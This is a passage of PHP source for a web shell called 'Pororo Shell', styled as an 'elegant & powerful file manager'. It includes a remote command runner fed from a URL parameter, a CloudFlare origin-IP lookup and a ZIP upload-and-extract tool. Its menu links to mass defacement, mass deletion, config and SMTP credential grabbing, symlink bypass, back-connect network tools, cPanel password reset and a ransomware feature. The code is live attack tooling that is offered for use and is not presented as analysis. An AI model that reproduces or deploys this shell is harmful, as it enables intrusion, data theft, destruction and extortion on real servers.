                Auth: $smtp_auth<br>
                Secure: $smtp_secure
            </div>";
        }
    }
    echo "<small class='text-muted'>Note: This tool works best when run inside a config folder.</small>";
    echo "</div></div>";
    exit;
}
function bypasscf() {
    echo "<div class='card shadow-lg border-0' style='border-radius:20px;'>
        <div class='card-body'>
            <h5 style='color:#ec407a;' class='text-center mb-4'><i class='fas fa-cloud'></i> Bypass CloudFlare</h5>
            <form method='POST'>
                <div class='form-group'>
                    <select class='form-control' name='idsPilih' style='border-radius:50px;'>
                        <option>Select Method</option>
                        <option>ftp</option>
                        <option>direct-connect</option>
                        <option>webmail</option>
                        <option>cpanel</option>
                    </select>
                </div>
                <div class='input-group mb-4'>
                    <input class='form-control' type='text' name='target' placeholder='Enter URL' style='border-radius:50px 0 0 50px;'>
                    <button type='submit' class='btn btn-pink' style='border-radius:0 50px 50px 0;'><i class='fas fa-search'></i> Bypass</button>
                </div>
            </form>";
    $target = $_POST['target'];
    if ($_POST['idsPilih'] == 'ftp') {
        $ftp = gethostbyname('ftp.'."$target");
        echo "<div class='alert alert-success mt-3'>Real IP: <strong>$ftp</strong></div>";
    }
    if ($_POST['idsPilih'] == 'direct-connect') {
        $direct = gethostbyname('direct-connect.'."$target");
        echo "<div class='alert alert-success mt-3'>Real IP: <strong>$direct</strong></div>";
    }
    if ($_POST['idsPilih'] == 'webmail') {
        $web = gethostbyname('webmail.'."$target");
        echo "<div class='alert alert-success mt-3'>Real IP: <strong>$web</strong></div>";
    }
    if ($_POST['idsPilih'] == 'cpanel') {
        $cpanel = gethostbyname('cpanel.'."$target");
        echo "<div class='alert alert-success mt-3'>Real IP: <strong>$cpanel</strong></div>";
    }
    echo "</div></div>";
    exit;
}
function zipMenu($dir, $file) {
    //Compress/Zip
    $exzip = basename($dir).'.zip';
    function Zip($source, $destination) {
        if (extension_loaded('zip') === true) {
            if (file_exists($source) === true) {
                $zip = new ZipArchive();
                if ($zip->open($destination, ZIPARCHIVE::CREATE) === true) {
                    $source = realpath($source);
                    if (is_dir($source) === true) {
                        $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($source), RecursiveIteratorIterator::SELF_FIRST);
                        foreach ($files as $file) {
                            $file = realpath($file);
                            if (is_dir($file) === true) {
                                // $zip->addEmptyDir(str_replace($source . '/', '', $file . '/'));
                            } elseif (is_file($file) === true) {
                                $zip->addFromString(str_replace($source.'/', '', $file), file_get_contents($file));
                            }
                        }
                    } elseif (is_file($source) === true) {
                        $zip->addFromString(basename($source), file_get_contents($source));
                    }
                }

                return @$zip->close();
            }
        }

        return false;
    }
    //Extract/Unzip
    function Zip_Extrack($zip_files, $to_dir) {
        $zip = new ZipArchive();
        $res = $zip->open($zip_files);
        if ($res === true) {
            $name = basename($zip_files, '.zip').'_unzip';
            @mkdir($name);
            @$zip->extractTo($to_dir.'/'.$name);

            return @$zip->close();
        } else {
            return false;
        }
    }
    echo "<div class='card shadow-lg border-0' style='border-radius:20px;'>
        <div class='card-body'>
            <h5 style='color:#ec407a;'><i class='fas fa-file-archive'></i> Zip Manager</h5>
            <div class='row'>
                <div class='col-md-6'>
                    <h6>Upload & Extract ZIP</h6>
                    <form enctype='multipart/form-data' method='post'>
                        <div class='custom-file mb-3'>
                            <input type='file' name='zip_file' class='custom-file-input' id='customFile'>
                            <label class='custom-file-label' for='customFile' style='border-radius:50px;'>Choose ZIP file...</label>
                        </div>
                        <button type='submit' name='upnun' class='btn btn-pink btn-block' style='border-radius:50px;'><i class='fas fa-upload'></i> Upload & Extract</button>
                    </form>";
    if ($_POST['upnun']) {
        $filename = $_FILES['zip_file']['name'];
        $tmp = $_FILES['zip_file']['tmp_name'];
        if (move_uploaded_file($tmp, "$dir/$filename")) {
            echo Zip_Extrack($filename, $dir);
            unlink($filename);
            $swa = 'success';
            $text = 'ZIP extracted successfully';
            swall($swa, $text, $dir);
        } else {
            echo '<div class="alert alert-danger mt-3">Upload failed!</div>';
        }
    }
    echo "</div>
                <div class='col-md-6'>
                    <h6>Create ZIP Backup</h6>
                    <form method='post'>
                        <div class='input-group mb-3'>
                            <div class='input-group-prepend'>
                                <span class='input-group-text' style='border-radius:50px 0 0 50px; background:#fce4ec;'><i class='fas fa-folder' style='color:#ec407a;'></i></span>
                            </div>
                            <input type='text' name='folder' class='form-control' value='$dir' style='border-radius:0 50px 50px 0;'>
                        </div>
                        <button type='submit' name='backup' class='btn btn-pink btn-block' style='border-radius:50px;'><i class='fas fa-download'></i> Create ZIP</button>
                    </form>";
    if ($_POST['backup']) {
        $fol = $_POST['folder'];
        if (Zip($fol, $_POST['folder'].'/'.$exzip)) {
            $swa = 'success';
            $text = 'ZIP created successfully';
            swall($swa, $text, $dir);
        } else {
            echo '<div class="alert alert-danger mt-3">Failed to create ZIP!</div>';
        }
    }
    echo "</div>
                <div class='col-md-12 mt-4'>
                    <h6>Manual Extract</h6>
                    <form action='' method='post'>
                        <div class='input-group'>
                            <input type='text' name='file_zip' class='form-control' value='$dir/$exzip' style='border-radius:50px 0 0 50px;'>
                            <button type='submit' name='extrak' class='btn btn-pink' style='border-radius:0 50px 50px 0;'><i class='fas fa-file-archive'></i> Extract</button>
                        </div>
                    </form>";
    if ($_POST['extrak']) {
        $zip = $_POST['file_zip'];
        if (Zip_Extrack($zip, $dir)) {
            $swa = 'success';
            $text = 'ZIP extracted successfully';
            swall($swa, $text, $dir);
        } else {
            echo '<div class="alert alert-danger mt-3">Extraction failed!</div>';
        }
    }
    echo "</div>
            </div>
        </div>
    </div>";
}
?>
<!DOCTYPE html>
<html>
    <head>
        <meta name="viewport" content="width=device-width, initial-scale=1"/>
        <meta name="theme-color" content="#f8bbd0"/>
        <meta name="author" content="Pororo"/>
        <meta name="copyright" content="Pororo Shell"/>
        <link rel="icon" type="image/png" href="https://cdn-icons-png.flaticon.com/512/1995/1995572.png"/>
        <title>Pororo Shell</title>
        <link href="https://fonts.googleapis.com/css2?family=Quicksand:wght@300;400;500;600;700&display=swap" rel="stylesheet">
        <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.0/css/bootstrap.min.css"/>
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.10.2/css/all.min.css"/>
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css"/>
        <script src="https://code.jquery.com/jquery-3.3.1.js"></script>
        <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/sweetalert2@8.18.0/dist/sweetalert2.all.min.js"></script>
        <style>
            * {
                font-family: 'Quicksand', sans-serif;
            }
            body {
                background: linear-gradient(135deg, #fce4ec 0%, #f8bbd0 100%);
                min-height: 100vh;
                padding-bottom: 30px;
            }
            .navbar {
                background: rgba(255,255,255,0.2);
                backdrop-filter: blur(10px);
                border-radius: 0 0 20px 20px;
            }
            .btn-pink {
                background: linear-gradient(135deg, #ec407a, #f06292);
                border: none;
                color: white;
                transition: all 0.3s;
            }
            .btn-pink:hover {
                transform: translateY(-2px);
                background: linear-gradient(135deg, #d81b60, #ec407a);
                color: white;
            }
            .btn-outline-pink {
                border: 2px solid #ec407a;
                background: transparent;
                color: #ec407a;
                transition: all 0.3s;
            }
            .btn-outline-pink:hover {
                background: #ec407a;
                color: white;
                transform: translateY(-2px);
            }
            .card {
                border-radius: 25px !important;
                border: none;
                transition: transform 0.3s;
            }
            .card:hover {
                transform: translateY(-5px);
            }
            .form-control {
                border-radius: 50px;
                border: 2px solid #f8bbd0;
                padding: 12px 20px;
            }
            .form-control:focus {
                border-color: #ec407a;
                box-shadow: 0 0 0 0.2rem rgba(236,64,122,0.25);
            }
            .custom-file-label {
                border-radius: 50px;
                border: 2px solid #f8bbd0;
            }
            .custom-file-label::after {
                border-radius: 0 50px 50px 0;
                background: #fce4ec;
                color: #ec407a;
            }
            table {
                border-radius: 20px;
                overflow: hidden;
            }
            .table thead th {
                background: #ec407a;
                color: white;
                border: none;
                padding: 15px;
            }
            .table tbody tr:hover {
                background: #fce4ec;
            }
            .scrollToTop {
                position: fixed;
                bottom: 30px;
                right: 30px;
                width: 45px;
                height: 45px;
                background: #ec407a;
                color: white;
                border-radius: 50%;
                text-align: center;
                line-height: 45px;
                box-shadow: 0 5px 15px rgba(0,0,0,0.2);
                transition: all 0.3s;
                z-index: 1000;
            }
            .scrollToTop:hover {
                transform: scale(1.1);
                background: #d81b60;
                color: white;
            }
            .fiture {
                margin: 4px;
                border-radius: 50px !important;
            }
            .badge {
                border-radius: 50px !important;
                padding: 8px 12px;
            }
            .text-pink {
                color: #ec407a;
            }
            .bg-pink {
                background: #ec407a;
            }
            pre {
                background: #fff;
                padding: 15px;
                border-radius: 20px;
                color: #333;
                overflow-x: auto;
            }
            .alert {
                border-radius: 50px;
            }
            @media(max-width:768px) {
                .fiture {
                    font-size: 12px;
                    padding: 6px 12px;
                }
                .table {
                    font-size: 12px;
                }
                .badge {
                    padding: 4px 8px;
                }
            }
        </style>
    </head>
    <body>
        <nav class="navbar static-top navbar-dark">
            <div class="container">
                <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#info" aria-label="Toggle navigation" style="border:none;">
                    <i style="color:#fff; font-size:24px;" class="fa fa-heart"></i>
                </button>
                <div class="collapse navbar-collapse" id="info">
                    <ul class="navbar-nav ml-auto">
                        <li class="nav-item d-inline-block">
                            <a href="https://facebook.com" class="nav-link d-inline-block text-white"><i class="fab fa-facebook"></i></a>
                            <a href="https://instagram.com" class="nav-link d-inline-block text-white"><i class="fab fa-instagram"></i></a>
                            <a href="https://github.com" class="nav-link d-inline-block text-white"><i class="fab fa-github"></i></a>
                        </li>
                    </ul>
                </div>
            </div>
        </nav>

        <div class="container mt-4">
            <!-- Header -->
            <div class="text-center mb-4">
                <i class="fas fa-heart" style="font-size: 50px; color:#ec407a;"></i>
                <h1 class="mt-2" style="color:#ec407a; font-weight:700;">PORORO SHELL</h1>
                <p class="text-white">🌸 elegant & powerful file manager 🌸</p>
                <hr style="background:#fff; opacity:0.3;">
            </div>

            <!-- Quick Actions -->
            <div class="d-flex justify-content-center flex-wrap mb-4">
                <a href="?" class="fiture btn btn-pink"><i class="fas fa-home"></i> Home</a>
                <a href="?dir=<?= $dir ?>&aksi=upload" class="fiture btn btn-pink"><i class="fas fa-upload"></i> Upload</a>
                <a href="?dir=<?= $dir ?>&aksi=buat_file" class="fiture btn btn-pink"><i class="fas fa-plus-circle"></i> New File</a>
                <a href="?dir=<?= $dir ?>&aksi=buat_folder" class="fiture btn btn-pink"><i class="fas fa-folder-plus"></i> New Folder</a>
                <a href="?dir=<?= $dir ?>&aksi=masdef" class="fiture btn btn-outline-pink"><i class="fas fa-exclamation-triangle"></i> Mass Deface</a>
                <a href="?dir=<?= $dir ?>&aksi=masdel" class="fiture btn btn-outline-pink"><i class="fas fa-trash"></i> Mass Delete</a>
                <a href="?dir=<?= $dir ?>&aksi=jumping" class="fiture btn btn-outline-pink"><i class="fas fa-search"></i> Jumping</a>
                <a href="?dir=<?= $dir ?>&aksi=config" class="fiture btn btn-outline-pink"><i class="fas fa-database"></i> Config</a>
                <a href="?dir=<?= $dir ?>&aksi=adminer" class="fiture btn btn-outline-pink"><i class="fas fa-user"></i> Adminer</a>
                <a href="?dir=<?= $dir ?>&aksi=symlink" class="fiture btn btn-outline-pink"><i class="fas fa-link"></i> Symlink</a>
                <a href="?dir=<?= $dir ?>&aksi=bctools" class="fiture btn btn-outline-pink"><i class="fas fa-network-wired"></i> Network</a>
                <a href="?dir=<?= $dir ?>&aksi=resetpasscp" class="fiture btn btn-warning"><i class="fas fa-key"></i> Reset CPanel</a>
                <a href="?dir=<?= $dir ?>&aksi=auteduser" class="fiture btn btn-warning"><i class="fas fa-user-edit"></i> Auto Edit</a>
                <a href="?dir=<?= $dir ?>&aksi=ransom" class="fiture btn btn-warning"><i class="fas fa-lock"></i> Ransomware</a>
                <a href="?dir=<?= $dir ?>&aksi=smtpgrab" class="fiture btn btn-warning"><i class="fas fa-envelope"></i> SMTP Grab</a>
                <a href="?dir=<?= $dir ?>&aksi=bypascf" class="fiture btn btn-warning"><i class="fas fa-cloud"></i> Bypass CF</a>
                <a href="?dir=<?= $dir ?>&aksi=zip_menu" class="fiture btn btn-warning"><i class="fas fa-file-archive"></i> Zip</a>
                <a href="?about" class="fiture btn btn-info"><i class="fas fa-info-circle"></i> About</a>
                <a href="?keluar" class="fiture btn btn-secondary"><i class="fas fa-sign-out-alt"></i> Logout</a>
            </div>

            <div class="row">
                <!-- Sidebar Info -->
                <div class="col-lg-4 mb-4">
                    <!-- Terminal -->
                    <div class="card shadow-lg">
                        <div class="card-body">
                            <h5 class="text-pink"><i class="fas fa-terminal"></i> Quick Command</h5>
                            <form>
                                <div class="input-group">
                                    <div class="input-group-prepend">
                                        <span class="input-group-text bg-white" style="border-radius:50px 0 0 50px;"><i class="fas fa-code" style="color:#ec407a;"></i></span>
                                    </div>
                                    <input type="text" class="form-control" name="cmd" autocomplete="off" placeholder="id | uname -a | whoami" style="border-radius:0 50px 50px 0;">
                                </div>
                            </form>
                        </div>
                    </div>

                    <!-- System Info -->
                    <div class="card shadow-lg mt-4">
                        <div class="card-body">
                            <h5 class="text-pink"><i class="fas fa-server"></i> System Info</h5>
                            <table class="table table-sm">
                                <tr><td><i class="fab fa-php"></i> PHP</td><td>: <?= $ver ?></td></tr>
                                <tr><td><i class="fas fa-network-wired"></i> IP</td><td>: <?= $ip ?></td></tr>
                                <tr><td><i class="fas fa-hdd"></i> HDD</td><td>: <?=formatSize($total) ?> (Free: <?=formatSize($free) ?>)</td></tr>
                                <tr><td><i class="fas fa-globe"></i> Domain</td><td>: <?= $dom ?></td></tr>
                                <tr><td><i class="fas fa-database"></i> MySQL</td><td>: <?= $mysql ?></td></tr>
                                <tr><td><i class="fas fa-cloud-upload-alt"></i> cURL</td><td>: <?= $curl ?></td></tr>
                                <tr><td><i class="fas fa-envelope"></i> Mailer</td><td>: <?= $mail ?></td></tr>
                                <tr><td><i class="fas fa-ban"></i> Disabled Func</td><td>: <?= $show_ds ?></td></tr>
                                <tr><td><i class="fas fa-cog"></i> Software</td><td>: <?= $sof ?></td></tr>
                                <tr><td><i class="fab fa-linux"></i> OS</td><td>: <?= $os ?></td></tr>
                            </table>
                        </div>
                    </div>
                </div>

                <!-- File Manager -->
                <div class="col-lg-8">
                    <?php
                    //keluar
                    if (isset($_GET['keluar'])) {
                        session_start();
                        session_destroy();
                        echo '<script>window.location="?";</script>';
                    }
                    //cmd
                    if (isset($_GET['cmd'])) {
                        echo "<pre class='bg-white text-dark p-3 rounded'>".exe($_GET['cmd']).'</pre>';
                        exit;
                    }
                    //about
                    if (isset($_GET['about'])) {
                        about();
                    }
                    //upload
                    if ($_GET['aksi'] == 'upload') {
                        aksiUpload($dir);
                    }
                    //openfile
                    if (isset($_GET['file'])) {
                        $file = $_GET['file'];
                    }
                    $nfile = basename($file);
                    //chmod
                    if ($_GET['aksi'] == 'chmod_file') {
                        chmodFile($dir, $file, $nfile);
                    }
                    //buat_file
                    if ($_GET['aksi'] == 'buat_file') {
                        buatFile($dir, $imgfile);
                    }
                    //view
                    if ($_GET['aksi'] == 'view') {
                        view($dir, $file, $nfile, $imgfile);
                    }
                    //edit
                    if ($_GET['aksi'] == 'edit') {
                        editFile($dir, $file, $nfile, $imgfile);
                    }
                    //rename
                    if ($_GET['aksi'] == 'rename') {
                        renameFile($dir, $file, $nfile, $imgfile);
                    }
                    //Delete File
                    if ($_GET['aksi'] == 'hapusf') {
                        hapusFile($dir, $file, $nfile);
                    }
                    $ndir = $_GET['target'];
                    //chmod
                    if ($_GET['aksi'] == 'chmod_dir') {
                        chmodFolder($dir, $ndir);
                    }
                    //Add Folder
                    if ($_GET['aksi'] == 'buat_folder') {
                        buatFolder($dir, $imgfol);
                    }
                    //Rename Folder
                    if ($_GET['aksi'] == 'rename_folder') {
                        renameFolder($dir, $ndir, $imgfol);
                    }
                    //Delete Folder
                    if ($_GET['aksi'] == 'hapus_folder') {
                        deleteFolder($dir, $ndir);
                    }

                    if ($_GET['aksi'] == 'masdef') {
                        aksiMasdef($dir, $file, $imgfol, $imgfile);
                    }
                    if ($_GET['aksi'] == 'masdel') {
                        aksiMasdel($dir, $file, $imgfol, $imgfile);
                    }
                    if ($_GET['aksi'] == 'jumping') {
                        aksiJump($dir, $file, $ip);
                    }
                    if ($_GET['aksi'] == 'config') {
                        aksiConfig($dir, $file);
                    }
                    if ($_GET['aksi'] == 'passwbypass') {
                        aksiBypasswd($dir, $file);
                    }
                    if ($_GET['aksi'] == 'adminer') {
                        aksiAdminer($dir, $file);
                    }
                    if ($_GET['aksi'] == 'symlink') {
                        aksiSym($dir, $file);
                    }
                    if ($_GET['aksi'] == 'symread') {
                        aksiSymread($dir, $file);
                    }
                    if ($_GET['aksi'] == 'sym_404') {
                        sym404($dir, $file);
                    }
                    if ($_GET['aksi'] == 'sym_bypas') {
                        symBypass($dir, $file);
                    }
                    if ($_GET['aksi'] == 'bctools') {
                        bcTool($dir, $file);
                    }
                    if ($_GET['aksi'] == 'disabfunc') {
                        disabFunc($dir, $file);
                    }
                    if ($_GET['aksi'] == 'resetpasscp') {
                        resetCp($dir);
                    }
                    if ($_GET['aksi'] == 'auteduser') {
                        autoEdit($dir, $file);
                    }
                    if ($_GET['aksi'] == 'ransom') {
                        ransom($dir, $file);
                    }
                    if ($_GET['aksi'] == 'smtpgrab') {
                        scj($dir);
                    }
                    if ($_GET['aksi'] == 'bypascf') {
                        bypasscf();
                    }
                    if ($_GET['aksi'] == 'zip_menu') {
                        zipMenu($dir, $file);
                    }
                    
                    $dirs = explode('/', $dir);
                    echo '<div class="card shadow-lg mb-4">
                        <div class="card-body">
                            <i class="fas fa-folder-open text-pink"></i> <strong>Current Path:</strong> ';
                    foreach ($dirs as $id=>$pat) {
                        if ($pat == '' && $id == 0) {
                            $a = true;
                            echo '<a href="?dir=/" class="text-pink">/</a>';
                            continue;
                        }
                        if ($pat == '') {
                            continue;
                        }
                        echo '<a style="word-wrap:break-word;" href="?dir=';
                        for ($i = 0; $i <= $id; $i++) {
                            echo "$dirs[$i]";
                            if ($i != $id) {
                                echo '/';
                            }
                        }
                        echo '" class="text-pink">'.$pat.'</a>/';
                    }
                    echo ' <span class="badge bg-pink text-white">'.w($dir, perms($dir)).'</span>
                        </div>
                    </div>';
                    $scandir = scandir($dir);
                    ?>
                    <div class="card shadow-lg">
                        <div class="table-responsive">
                            <table class="table table-hover mb-0">
                                <thead>
                                    <tr>
                                        <th><i class="fas fa-file"></i> Name</th>
                                        <th><i class="fas fa-weight-hanging"></i> Size</th>
                                        <th><i class="far fa-clock"></i> Modified</th>
                                        <th><i class="fas fa-lock"></i> Perm</th>
                                        <th><i class="fas fa-tools"></i> Actions</th>
                                    </tr>
                                </thead>
                                <tbody>
                                    <?php
                                    if (count($scandir) == 2) {
                                        echo "<tr><td colspan='5' class='text-center text-muted'><i class='fas fa-folder-open'></i> Directory is empty</td></tr>";
                                    }
                                    foreach ($scandir as $dirb) {
                                        $dtime = date('d/m/y G:i', filemtime("$dirb/$dirx"));
                                        if (strlen($dirb) > 18) {
                                            $_dir = substr($dirb, 0, 18).'...';
                                        } else {
                                            $_dir = $dirb;
                                        }
                                        if (!is_dir($dir.'/'.$dirb) || $dirb == '.' || $dirb == '..') {
                                            continue;
                                        } ?>
                                        <tr>
                                            <td class="pinggir"><?= $imgfol ?> <a href="?dir=<?= $dir ?>/<?= $dirb ?>" class="text-pink"><?= $_dir ?></a></td>
                                            <td>--</td>
                                            <td><?= $dtime ?></td>
                                            <td>
                                                <a href="?dir=<?= $dir ?>&target=<?= $dirb ?>&aksi=chmod_dir">
                                                <?php
                                                if (is_writable($dir.'/'.$dirb)) {
                                                    $color = '#4caf50';
                                                } elseif (!is_readable($dir.'/'.$dirb)) {
                                                    $color = '#e91e63';
                                                } else {
                                                    $color = '#ff9800';
                                                }
                                                echo "<span style='color:$color'>".perms($dir.'/'.$dirb).'</span>'; ?>
                                                </a>
                                            </td>
                                            <td>
                                                <a title="Rename" class="badge badge-success" href="?dir=<?= $dir ?>&target=<?= $dirb ?>&aksi=rename_folder"><i class="fas fa-pen"></i></a>
                                                <a title="Delete" class="badge badge-danger" href="?dir=<?= $dir ?>&target=<?= $dirb ?>&aksi=hapus_folder"><i class="fas fa-trash"></i></a>
                                            </td>
                                        </tr>
                                    <?php
                                    }

                                    foreach ($scandir as $file) {
                                        $ftime = date('d/m/y G:i', filemtime("$dir/$file"));
                                        if (!is_file($dir.'/'.$file)) {
                                            continue;
                                        }
                                        if (strlen($file) > 25) {
                                            $_file = substr($file, 0, 25).'...';
                                        } else {
                                            $_file = $file;
                                        }
                                        $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION)); ?>
                                        <tr>
                                            <td>
                                                <?= iconFile($ext) ?>
                                                <a href="?dir=<?= $dir ?>&aksi=view&file=<?= $dir ?>/<?= $file ?>" class="text-pink"><?= $_file ?></a>
                                            </td>
                                            <td><?= formatSize(filesize($file)) ?></td>
                                            <td><?= $ftime ?></td>
                                            <td>
                                                <a href="?dir=<?= $dir ?>&aksi=chmod_file&file=<?= $dir ?>/<?= $file ?>">
                                                <?php
                                                if (is_writable($dir.'/'.$file)) {
                                                    $color = '#4caf50';
                                                } elseif (!is_readable($dir.'/'.$file)) {
                                                    $color = '#e91e63';
                                                } else {
                                                    $color = '#ff9800';
                                                }
                                                echo "<span style='color:$color'>".perms($dir.'/'.$file).'</span>'; ?>
                                                </a>
                                            </td>
                                            <td class="d-flex">
                                                <a title="View" class="badge badge-info" href="?dir=<?= $dir ?>&aksi=view&file=<?= $dir ?>/<?= $file ?>"><i class="fas fa-eye"></i></a>
                                                <a title="Edit" class="badge badge-success" href="?dir=<?= $dir ?>&aksi=edit&file=<?= $dir ?>/<?= $file ?>"><i class="fas fa-edit"></i></a>
                                                <a title="Rename" class="badge badge-warning" href="?dir=<?= $dir ?>&aksi=rename&file=<?= $dir ?>/<?= $file ?>"><i class="fas fa-pen"></i></a>
                                                <a title="Delete" class="badge badge-danger" href="?dir=<?= $dir ?>&aksi=hapusf&file=<?= $dir ?>/<?= $file ?>"><i class="fas fa-trash"></i></a>
                                                <a title="Download" class="badge badge-primary" href="?&dir=<?= $dir ?>&aksi=download&file=<?= $dir ?>/<?= $file ?>"><i class="fas fa-download"></i></a>
                                            </td>
                                        </tr>
                                    <?php
                                    }
                                    ?>
                                </tbody>
                            </table>
                        </div>
                    </div>
                    <hr/>
                    <center class="text-white-50">
                        <small>🌸 Pororo Shell | Made with <i class="fas fa-heart" style="color:#ec407a;"></i> for elegant web management 🌸</small>
                    </center>
                </div>
            </div>
        </div>
        <a href='#' class='scrollToTop'><i class='fas fa-arrow-up'></i></a>
        <script>
            $(document).ready(function(){
                $(window).scroll(function(){
                    if ($(this).scrollTop() > 700){
                        $(".scrollToTop").fadeIn();
                    }else{
                        $(".scrollToTop").fadeOut();
                    }
                });
                $(".scrollToTop").click(function(){
                    $("html, body").animate({scrollTop : 0},1000);
                    return false;
                });
                $('input[type="file"]').on("change", function(){
                    let filenames = [];
                    let files = document.getElementById("customFile").files;
                    if (files.length > 1){
                        filenames.push("Total Files (" + files.length + ")");
                    }else{
                        for (let i in files){
                            if (files.hasOwnProperty(i)){
                                filenames.push(files[i].name);
                            }
                        }
                    }
                    $(this).next(".custom-file-label").html(filenames.join(","));
                });
                var max_fields = 5;
                var x = 1;
                $(document).on('click', '#add_input', function(e){
                    if(x < max_fields){
                        x++;
                        $('#output').append('<div class=\"input-group form-group\" id=\"out\"><input type=\"text\" class=\"form-control\" name=\"nama_file[]\" placeholder=\"Filename...\" style=\"border-radius:50px;\"><div class=\"input-group-append\"><span class=\"input-group-text remove\" style=\"cursor:pointer; background:#e91e63; color:white; border-radius:50px;\"><i class=\"fas fa-minus\"></i></span></div></div>');
                    }
                    $('#output').on("click",".remove", function(e){
                        e.preventDefault(); $(this).parent().parent('#out').remove(); x--;
                    })
                });
                $(document).on('click', '#add_input1', function(e){
                    if(x < max_fields){
                        x++;
                        $('#output1').append('<div class=\"input-group form-group\" id=\"out\"><input type=\"text\" class=\"form-control\" name=\"nama_folder[]\" placeholder=\"Folder name...\" style=\"border-radius:50px;\"><div class=\"input-group-append\"><span class=\"input-group-text remove\" style=\"cursor:pointer; background:#e91e63; color:white; border-radius:50px;\"><i class=\"fas fa-minus\"></i></span></div></div>');
                    }
                    $('#output1').on("click",".remove", function(e){
                        e.preventDefault(); $(this).parent().parent('#out').remove(); x--;
                    })
                });
            });
        </script>
    </body>
</html>
